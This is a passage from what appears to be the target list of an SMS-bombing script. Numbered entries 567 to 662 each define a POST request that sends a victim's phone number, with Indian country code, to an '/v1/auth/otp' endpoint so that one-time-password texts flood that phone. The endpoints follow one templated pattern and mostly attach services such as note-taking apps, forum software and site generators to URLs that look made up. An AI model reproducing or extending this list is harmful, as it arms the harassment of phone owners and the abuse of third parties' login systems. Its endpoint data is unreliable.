    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 568
{
    'name': 'Osmosis_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.osmosis.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 569
{
    'name': 'Juno_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.juno.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 570
{
    'name': 'Evmos_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.evmos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 571
{
    'name': 'Cronos_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cronos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 572
{
    'name': 'Fantom_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fantom.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 573
{
    'name': 'Moonbeam_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.moonbeam.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 574
{
    'name': 'Moonriver_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.moonriver.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 575
{
    'name': 'Astar_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.astar.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 576
{
    'name': 'Shiden_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.shiden.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 577
{
    'name': 'Kava_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kava.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 578
{
    'name': 'Band_Protocol_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bandprotocol.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 579
{
    'name': 'Chainlink_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.chainlink.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 580
{
    'name': 'API3_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.api3.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 581
{
    'name': 'Theta_Fuel_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.thetafuel.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 582
{
    'name': 'IoTeX_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.iotex.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 583
{
    'name': 'Helium_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.helium.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 584
{
    'name': 'Filebase_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.filebase.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 585
{
    'name': 'Spheron_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.spheron.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 586
{
    'name': 'Akash_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.akash.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 587
{
    'name': 'Cudos_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cudos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 588
{
    'name': 'Fetch_AI_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fetch.ai/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 589
{
    'name': 'SingularityNET_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.singularitynet.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 590
{
    'name': 'Ocean_Protocol_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.oceanprotocol.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 591
{
    'name': 'Covalent_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.covalent.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 592
{
    'name': 'TheGraph_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.thegraph.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 593
{
    'name': 'Subgraph_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.subgraph.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 594
{
    'name': 'Ceramic_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ceramic.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 595
{
    'name': 'Textile_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.textile.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 596
{
    'name': 'OrbitDB_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.orbitdb.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 597
{
    'name': 'Pinata_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pinata.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 598
{
    'name': 'NFT_Storage_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nft.storage/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 599
{
    'name': 'Web3_Storage_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.web3.storage/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 600
{
    'name': 'Estuary_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.estuary.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 601
{
    'name': 'Fleek_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fleek.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 602
{
    'name': 'Ceramic_Network_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ceramicnetwork.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 603
{
    'name': '3Box_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.3box.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 604
{
    'name': 'Spruce_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.spruce.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 605
{
    'name': 'IDX_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.idx.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 606
{
    'name': 'Orbis_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.orbis.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 607
{
    'name': 'Crossbell_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.crossbell.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 608
{
    'name': 'Lens_Protocol_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.lensprotocol.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 609
{
    'name': 'Farcaster_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.farcaster.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 610
{
    'name': 'Orbit_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.orbit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 611
{
    'name': 'DeSo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.deso.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 612
{
    'name': 'Minds_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.minds.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 613
{
    'name': 'Gun_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gun.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 614
{
    'name': 'SecureScuttlebutt_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.scuttlebutt.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 615
{
    'name': 'Matrix_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.matrix.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 616
{
    'name': 'RocketChat_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rocketchat.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 617
{
    'name': 'Zulip_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zulip.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 618
{
    'name': 'Mattermost_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mattermost.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 619
{
    'name': 'Discourse_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.discourse.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 620
{
    'name': 'Flarum_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.flarum.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 621
{
    'name': 'Vanilla_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vanilla.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 622
{
    'name': 'Xenforo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.xenforo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 623
{
    'name': 'PhpBB_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.phpbb.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 624
{
    'name': 'MyBB_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mybb.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 625
{
    'name': 'SimpleMachines_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.simplemachines.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 626
{
    'name': 'PunBB_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.punbb.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 627
{
    'name': 'vBulletin_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vbulletin.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 628
{
    'name': 'IPBoard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ipboard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 629
{
    'name': 'WoltLab_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.woltlab.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 630
{
    'name': 'BurningBoard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.burningboard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 631
{
    'name': 'NodeBB_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nodebb.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 632
{
    'name': 'Ghost_Blog_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ghostblog.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 633
{
    'name': 'WriteFreely_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.writefreely.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 634
{
    'name': 'Plume_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.plume.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 635
{
    'name': 'Hugo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hugo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 636
{
    'name': 'Gatsby_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gatsby.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 637
{
    'name': 'NextJS_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nextjs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 638
{
    'name': 'Nuxt_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nuxt.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 639
{
    'name': 'SvelteKit_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sveltekit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 640
{
    'name': 'Astro_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.astro.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 641
{
    'name': 'VuePress_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vuepress.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 642
{
    'name': 'Docsify_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.docsify.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 643
{
    'name': 'GitBook_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gitbook.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 644
{
    'name': 'Notion_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.notion.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 645
{
    'name': 'Obsidian_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.obsidian.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 646
{
    'name': 'RoamResearch_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.roamresearch.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 647
{
    'name': 'Logseq_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.logseq.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 648
{
    'name': 'TiddlyWiki_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tiddlywiki.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 649
{
    'name': 'Zettlr_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zettlr.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 650
{
    'name': 'Trilium_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.trilium.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 651
{
    'name': 'Anytype_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.anytype.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 652
{
    'name': 'Craft_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.craft.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 653
{
    'name': 'Bear_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bear.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 654
{
    'name': 'Ulysses_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ulysses.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 655
{
    'name': 'Scrivener_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.scrivener.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 656
{
    'name': 'Typora_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.typora.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 657
{
    'name': 'MarkText_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.marktext.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 658
{
    'name': 'Zettlr_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zettlrcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 659
{
    'name': 'Notable_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.notable.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 660
{
    'name': 'Boostnote_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.boostnote.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 661
{
    'name': 'Caret_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.caret.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 662
{
    'name': 'Ghostwriter_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ghostwriter.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
